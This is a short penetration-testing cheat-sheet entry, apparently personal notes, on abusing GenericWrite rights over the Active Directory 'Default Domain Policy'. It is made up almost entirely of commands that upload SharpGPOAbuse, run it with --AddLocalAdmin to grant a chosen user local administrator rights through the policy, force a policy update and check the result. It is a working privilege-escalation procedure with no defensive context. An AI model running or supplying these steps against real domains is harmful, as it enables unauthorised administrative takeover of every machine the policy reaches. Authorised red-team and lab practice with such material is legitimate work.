- GenericWrite on "Default Domain Policy"

https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master

```sh
upload SharpGPOAbuse.exe
```

```sh
.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount <user>
```

```sh
gpupdate /force
```

Logout -> login

Check:
```sh
net localgroup administrators
```